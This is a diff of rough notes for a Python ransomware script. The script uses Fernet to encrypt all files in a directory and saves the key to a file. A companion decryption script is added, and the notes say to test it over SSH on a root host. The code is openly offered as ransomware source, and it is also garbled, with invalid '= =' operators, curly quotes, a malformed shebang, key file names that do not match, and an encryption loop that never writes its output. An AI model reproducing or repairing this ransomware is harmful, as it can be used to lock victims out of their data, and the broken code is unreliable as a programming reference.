@@ -1,22 +1,44 @@
 //Fernet - is a symmetric encryption method that guarantees that a message encrypted using it cannot be manipulated or read without the key. It uses URL safe codes encoding for the keys. Fernet also uses 128-bit AES.
 //To test, create a ssh to a root host server
 //Create some test files to test the ransomware. 
-//Create the ransomware file:
-nano ransomware.py //name of file 
-#!/user/bin/env python 3 //file pathway bash script
-import os 
+//Create the ransomware file
+
+nano ransom.py     //name of file 
+#!/user/bin/env python 3     //file pathway bash script
+import os  
 from cryptography.fernet import Fernet 
 files = []                              // Find all files in the directory to encrypt them and add them to a list.
 for file in os.listdir():   
-    if file = = “ransomeware.py” or file ==“thekey.key” or file == “ decrypt.py” :
+    if file = = “ransom.py” or file == “theK.key” or file == “decrypt.py” :
          continue
     if os.path.isfile(file):
         files.append(file)
 print(files)
 key = Fernet.generate_key()
 with open (“thekey.key”, “wb”) as thekey:      //wb = write binary (why binary!!)
-      thekey.write(key)
+      theK.write(key)
 for file in files:
       with open(file, “rb”) as thefile:
           contents= thefile.read()
       contents_encrypted = Fernet(key).encrypt(contents)
+      
+//Ransomware decryption script 
+// copy the ransomware folder and send it to another folder
+
+cp ransomware.py decrpty.py 
+nano decrypt 
+files = []                              
+for file in os.listdir():   
+    if file = = “ransom.py” or file ==“theK.key” or file == “decrypt.py”:
+         continue
+    if os.path.isfile(file):
+        files.append(file)
+print(files)
+with open(“theKey.key”, “rb” ) as key:
+  secretkey= key.read()
+for file in files:
+      with open(file, “rb”) as thefile:
+          contents= thefile.read()
+      contents_decrypted = Fernet(secretkey).decrypt(contents)
+      with open (file, “wb”) as thefile:
+           thefile.write(contents_decrypted)
